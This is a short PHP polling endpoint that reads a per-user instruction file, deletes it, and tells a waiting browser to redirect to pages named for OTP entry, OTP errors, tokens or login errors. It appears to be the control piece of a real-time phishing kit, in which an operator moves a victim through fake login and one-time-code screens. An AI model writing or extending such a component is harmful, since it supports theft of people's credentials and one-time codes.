<?php
session_start();
header('Content-Type: application/json');

if (!isset($_SESSION['usuario'])) {
    echo json_encode(["status" => "no_session"]);
    exit;
}

$usuario = $_SESSION['usuario'];
$archivo = "acciones/$usuario.txt";
if (file_exists($archivo)) {
    $destino = trim(file_get_contents($archivo));
    unlink($archivo);
    if (in_array($destino, ['opin.php', 'otperror.php', 'tok.php', 'tokenerror.php', 'loginerror.php'])) {
        echo json_encode(["status" => "redirigir", "destino" => $destino]);
        exit;
    }
}

echo json_encode(["status" => "esperando"]);
